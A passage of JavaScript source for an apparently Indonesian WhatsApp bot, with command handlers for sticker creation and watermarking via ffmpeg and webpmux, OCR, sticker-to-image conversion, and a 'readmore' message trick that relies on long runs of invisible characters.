hah = fs.readFileSync(ran)
client.sendMessage(from, hah, video, { mimetype: 'video/mp4', quoted: mek })
})
await confirmLIMIT(sender, [angka])
break 	
case 'stickergif':
case 'sgif':
case 'stiker': 
case 'sticker':
case 'sk':
case 's':
if (isBanned) return replysticker(banstc)
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
const media = await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.webp')
 await ffmpeg(`./${media}`)
.input(media)
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
reply(ind.stikga())
})
.on('end', function () {
console.log('Finish')
exec(`webpmux -set exif ${addMetadata(namo, ator)} ${ran} -o ${ran}`, async (error) => {
buffer = fs.readFileSync(ran)
client.sendMessage(from, buffer, sticker, {quoted: mek})
fs.unlinkSync(media)
fs.unlinkSync(ran)
})
})
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(ran)
} else if ((isMedia && mek.message.videoMessage.seconds < 10 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 10) && args.length == 0) {
const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
const media = await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.webp')
 await ffmpeg(`./${media}`)
.inputFormat(media.split('.')[1])
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
tipe = media.endsWith('.mp4') ? 'video' : 'gif'
reply(ind.stikga())
})
.on('end', function () {
console.log('Finish')
exec(`webpmux -set exif ${addMetadata(namo, ator)} ${ran} -o ${ran}`, async (error) => {
buffer = fs.readFileSync(ran)
client.sendMessage(from, buffer, sticker, {quoted: mek})
fs.unlinkSync(media)
fs.unlinkSync(ran)
})
})
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(ran)
  } else if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
const media = await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.webp')
 await ffmpeg(`./${media}`)
.input(media)
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
reply(ind.stikga())
})
.on('end', function () {
console.log('Finish')
exec(`webpmux -set exif ${addMetadata(namo, ator)} ${ran} -o ${ran}`, async (error) => {
buffer = fs.readFileSync(ran)
client.sendMessage(from, buffer, sticker, {quoted: mek})
fs.unlinkSync(media)
fs.unlinkSync(ran)
})
})
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(ran)
} else {
reply(`Kirim gambar dengan caption ${prefix}sticker atau reply/tag gambar(durasi sticker video 1-9 detik)`)
}
await confirmLIMIT(sender, [angka])
break
case 'stikerwm':
case 'stickerwm':
case 'swm':
case 'wm':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if (!isPremium) return replysticker(premiumstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!isPremium && !isOwner) return replysticker(premiumstc)
pe = args.join(' ')
var a = pe.split("|")[0];
var b = pe.split("|")[1];
if (isMedia && !mek.message.videoMessage || isQuotedImage ) {
const encmedia = isQuotedImage   ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
 media = await client.downloadAndSaveMediaMessage(encmedia)
await createExif(a,b)
out = getRandom('.webp')
ffmpeg(media)
.on('error', (e) => {
console.log(e)
client.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: mek })
fs.unlinkSync(media)
})
.on('end', () => {
_out = getRandom('.webp')
spawn('webpmux', ['-set','exif','./temp/data.exif', out, '-o', _out])
.on('exit', () => {
client.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek })
fs.unlinkSync(out)
fs.unlinkSync(_out)
fs.unlinkSync(media)
})
})
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(out) 
} else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
const media = await client.downloadAndSaveMediaMessage(encmedia)
pe = args.join('')
var a = pe.split("|")[0];
var b = pe.split("|")[1];
await createExif(a,b)
out = getRandom('.webp')
ffmpeg(media)
.on('error', (e) => {
console.log(e)
client.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: mek })
fs.unlinkSync(media)
})
.on('end', () => {
_out = getRandom('.webp')
spawn('webpmux', ['-set','exif','./temp/data.exif', out, '-o', _out])
.on('exit', () => {
client.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek })
fs.unlinkSync(out)
fs.unlinkSync(_out)
fs.unlinkSync(media)
})
})
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(out)   
} else if (isMedia && !mek.message.videoMessage || isQuotedSticker ) {
const encmedia = isQuotedSticker   ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
const media = await client.downloadAndSaveMediaMessage(encmedia)
pe = args.join('')
var a = pe.split("|")[0];
var b = pe.split("|")[1];
await createExif(a,b)
out = getRandom('.webp')
ffmpeg(media)
.on('error', (e) => {
console.log(e)
client.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: mek })
fs.unlinkSync(media)
})
.on('end', () => {
_out = getRandom('.webp')
spawn('webpmux', ['-set','exif','./temp/data.exif', out, '-o', _out])
.on('exit', () => {
client.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek })
fs.unlinkSync(out)
fs.unlinkSync(_out)
fs.unlinkSync(media)
})
})
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(out)   
} else {
reply(`Kirim gambar dengan caption ${prefix}swm teks|teks atau tag gambar yang sudah dikirim`)
}
await confirmLIMIT(sender, [angka])
break   
case 'ocr': 
if (isBanned) return replysticker(banstc)
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (args.length < 0) return reply(`tag gambarnya lalu ketik ${prefix}${command}`)
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
const media = await client.downloadAndSaveMediaMessage(encmedia)
 await recognize(media, {lang: 'eng+ind', oem: 1, psm: 3})
.then(teks => {
reply(teks.trim())
fs.unlinkSync(media)
})
.catch(err => {
reply(err.message)
fs.unlinkSync(media)
})
} else {
reply(`*kirim foto dengan caption ${prefix}ocr*`)
}
await confirmLIMIT(sender, [angka])
break
case 'toimg':
if (isBanned) return replysticker(banstc)
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (!isQuotedSticker) return reply('reply/tag sticker!')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
const mediaaa = await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.png')
exec(`ffmpeg -i ${mediaaa} ${ran}`, (err) => {
fs.unlinkSync(mediaaa)
if (err) return reply(ind.stikga())
buffer = fs.readFileSync(ran)
client.sendMessage(from, buffer, image, {quoted: mek, thumbnail: Buffer.alloc(0)})
fs.unlinkSync(ran)
})
await confirmLIMIT(sender, [angka])
break	   
case 'readmore':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (args.length < 1) return reply(`cara menggunakan nya${prefix}‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎${command} Hai beb/an`)
var kls = body.slice(9)
var has = kls.split("/")[0];
var kas = kls.split("/")[1];
client.sendMessage(from, `${has}‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎